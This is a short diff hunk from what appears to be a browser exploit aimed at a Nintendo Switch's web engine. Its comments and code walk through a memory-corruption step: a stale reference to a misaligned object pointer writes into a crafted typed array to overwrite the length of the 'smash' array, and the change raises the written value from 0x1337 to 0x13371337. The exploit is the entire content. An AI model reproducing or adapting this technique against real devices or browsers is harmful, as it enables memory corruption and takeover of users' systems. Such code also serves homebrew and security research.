@@ -162,7 +162,7 @@
                                     alert('misaligned the pointer to the JSObject.\nstale[0] = '+stale[0]+'');
                                     // write to the 6th 32bit value of the memory pointed to by the crafted Uint32Array
                                     // which should point to the struct of smash, allowing us to overwrite the length of smash
-                                    stale[0][6] = 0x1337;
+                                    stale[0][6] = 0x13371337;
                                     // check the length of smash is now.
                                     alert('smash.length is now: 0x'+smash.length.toString(16));
                                     alert('done!\nswitch will probably crash now :O');
